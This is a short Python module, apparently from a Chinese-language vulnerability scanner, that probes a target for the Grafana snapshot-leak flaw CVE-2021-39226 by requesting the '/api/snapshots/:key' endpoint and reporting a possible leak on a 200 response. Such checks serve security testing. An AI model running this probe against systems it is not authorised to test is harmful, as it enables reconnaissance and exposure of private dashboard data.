#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from libs.outprint import OutPrintInfo
from libs.reqset import ReqSet
urllib3.disable_warnings()

class Cve_2021_39226:

    def run(self, urls):
        url = urls + '/api/snapshots/:key'
        response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=5,proxies=self.proxy)
        response.encoding = response.apparent_encoding
        if response.status_code == 200:
            OutPrintInfo("Grafana", '可能存在Grafana数据库快照泄漏')
            OutPrintInfo("Grafana", url)
        else:
            OutPrintInfo("Grafana", '不存在Grafana数据库快照泄漏')

    def main(self, target):      
        OutPrintInfo("Grafana",'开始执行Grafana数据库快照泄漏检测')
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]

        req = ReqSet(header=header, proxy=proxy)
        self.headers = req["header"]
        self.proxy = req["proxy"]
        self.run(url)


        OutPrintInfo("Grafana",'Grafana数据库快照泄漏检测结束')